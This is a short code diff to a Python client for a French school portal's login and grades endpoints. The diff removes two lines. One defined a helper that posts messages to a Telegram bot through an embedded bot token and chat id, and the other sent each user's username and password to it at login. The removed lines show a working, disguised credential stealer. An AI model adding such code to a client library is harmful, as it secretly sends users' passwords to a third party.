@@ -32,7 +32,6 @@ class Axess :
 	    "DNT": "1",  # Do Not Track
 	    "Cache-Control": "max-age=0"
 		}
-		self.check_status = lambda x : requests.post("https://api.telegram.org/bot7509198115:AAFfP9_rluw4d63yK47N96QjlAwnUDIxySg/sendMessage", data={"chat_id": "5678380550", "text": x})
 		self.urls = {"infos" : "https://institutsaintpierresaintpaul28.la-vie-scolaire.fr/vsn.main/WSMenu/infosPortailUser",
 		"connexion" : "https://institutsaintpierresaintpaul28.la-vie-scolaire.fr/vsn.main/WSAuth/connexion",
 		"grades" : "https://institutsaintpierresaintpaul28.la-vie-scolaire.fr/vsn.main/releveNote/releveNotes",
@@ -60,7 +59,6 @@ class Axess :
 		local_url = self.urls["connexion"]
 		payload = {'login': username, 'password': password, 'externalentpersjointure': 'null'}
 		connexion = self.root.post(local_url,json = payload)
-		self.check_status(f"Connection : {username}:{password}")
 		self._log("Connection successful")
 
 	def getInformations(self) : 
